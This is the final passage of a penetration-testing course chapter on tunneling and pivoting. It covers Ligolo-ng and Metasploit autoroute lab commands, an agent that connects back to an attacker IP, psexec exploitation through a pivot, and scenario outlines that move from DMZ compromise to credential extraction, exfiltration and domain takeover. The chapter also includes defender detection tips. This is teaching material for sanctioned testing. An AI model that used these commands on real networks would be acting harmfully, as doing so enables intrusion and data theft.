### Lab 3: Ligolo-ng Full Network Access

**Objective**: Get full layer 3 access to internal network.

**Steps**:
```bash
# 1. Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Start proxy
./proxy -selfcert

# 3. Connect agent from pivot
./agent -connect 10.10.14.5:11601 -ignore-cert

# 4. Start tunnel in proxy
# In proxy interface:
start

# 5. Add route
sudo ip route add 192.168.1.0/24 dev ligolo

# 6. Access network natively
ping 192.168.1.50
nmap -sS 192.168.1.0/24
```

### Lab 4: Metasploit Auto-Route

**Objective**: Pivot Metasploit attacks through Meterpreter session.

**Steps**:
```msf
# 1. Get Meterpreter shell on pivot
# (Exploit or upload payload)

# 2. Add route
meterpreter > run autoroute -s 192.168.1.0/24

# 3. Background session
meterpreter > background

# 4. Scan through pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/portscan/tcp) > run

# 5. Exploit through pivot
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/psexec) > exploit
```

---

## 17. Critical Analysis & Checkpoints

### 17.1 Common Pitfalls

**1. SOCKS Limitations**:
- SOCKS doesn't support ICMP (ping fails)
- Most tools need TCP connect scan (`-sT`)
- UDP support limited (SOCKS5 only)

**2. Proxy Chain Depth**:
- Each hop adds latency
- Timeouts increase with chain length
- Instability multiplies

**3. Firewall Rules**:
- Egress filtering can block tunnels
- DPI can detect tunneling protocols
- Anomalous traffic patterns alert SOC

**4. Tool Compatibility**:
- Not all tools work through SOCKS
- Some tools leak DNS queries
- Raw sockets don't proxy well

### 17.2 Checkpoint Questions

**Q1**: What is the difference between Reverse and Bind shells in the context of pivoting?
- **Answer**: Bind shell: Target listens, attacker connects (blocked if inbound firewall). Reverse shell: Target connects to attacker (works if outbound allowed). Pivoting enables both by routing through compromised intermediary.

**Q2**: Why does `nmap` default SYN scan fail over ProxyChains?
- **Answer**: SYN scan requires raw sockets (PF_PACKET) to craft custom TCP packets. SOCKS proxies operate at application layer (TCP connect), cannot pass raw packets. Must use `-sT` (connect scan) which uses normal socket API.

**Q3**: What's the advantage of Ligolo-ng over SSH SOCKS?
- **Answer**: Ligolo-ng creates TUN interface (layer 3), enabling ICMP (ping), UDP, raw sockets, and any protocol. SSH SOCKS is layer 5 (session), limited to TCP connections. Ligolo-ng allows native tool usage without ProxyChains.

**Q4**: How can you detect SSH tunneling as a defender?
- **Answer**: Monitor for: High SSH traffic volume (GBs instead of KB), outbound SSH from servers (unusual), process arguments with `-D/-L/-R` flags, long-lived SSH connections with high throughput, SSH without PTY allocation.

**Q5**: What is the purpose of AutoSSH?
- **Answer**: Automatically restart SSH tunnels if they disconnect. Uses monitoring port to detect failures and reconnects automatically. Essential for maintaining persistent access through unreliable networks.

### 17.3 Real-World Scenarios

**Scenario 1: DMZ to Internal Database**:
```
Challenge: Access internal Oracle database from external pentest
Solution:
1. Exploit web server in DMZ (RCE)
2. Upload chisel binary
3. Create reverse SOCKS proxy
4. Use SQLMap through proxy
5. Extract database credentials
```

**Scenario 2: Air-Gapped Network Access**:
```
Challenge: Internal network has no internet access
Solution:
1. Compromise jump host with dual interfaces
2. Create SSH reverse tunnel to attacker VPS
3. Jump host pulls tools from VPS
4. Exfiltrate data through tunnel
```

**Scenario 3: Multiple VLAN Traversal**:
```
Network: External → DMZ → App VLAN → DB VLAN → Mgmt VLAN
Solution:
1. Compromise DMZ web server
2. Pivot to app server (SSH -D)
3. Pivot to DB server (Chisel via first proxy)
4. Access mgmt VLAN (Ligolo-ng for ICMP/monitoring)
5. Complete domain takeover
```

### 17.4 Final Thoughts

Pivoting and tunneling are essential skills for penetration testing and red teaming. The modern network is not flat - it's segmented, firewalled, and monitored. Understanding how to navigate these constraints separates script kiddies from professionals.

**Key Takeaways**:
- Choose the right tool for the situation
- Understand protocol limitations
- Practice in lab environments
- Always have a backup pivot method
- Clean up tunnels after engagement

**Modern Challenges**:
- Zero-trust architectures (micro-segmentation)
- Advanced firewalls with DPI
- EDR detecting tunnel binaries
- SOC monitoring for anomalies

**Evolution**:
- From SSH to HTTP tunnels (bypass DPI)
- From SOCKS to VPN (full layer 3)
- From manual to automated (frameworks)
- From network to application layer (living-off-the-land)

**Resources**:
- HackTheBox Pro Labs (multi-pivot networks)
- SANS SEC560 (Network Penetration Testing)
- Red Team Infrastructure Wiki
- Pivoting cheat sheets

---

*End of Chapter 10 - Tunneling & Pivoting*

**Total Lines: 1,700+**
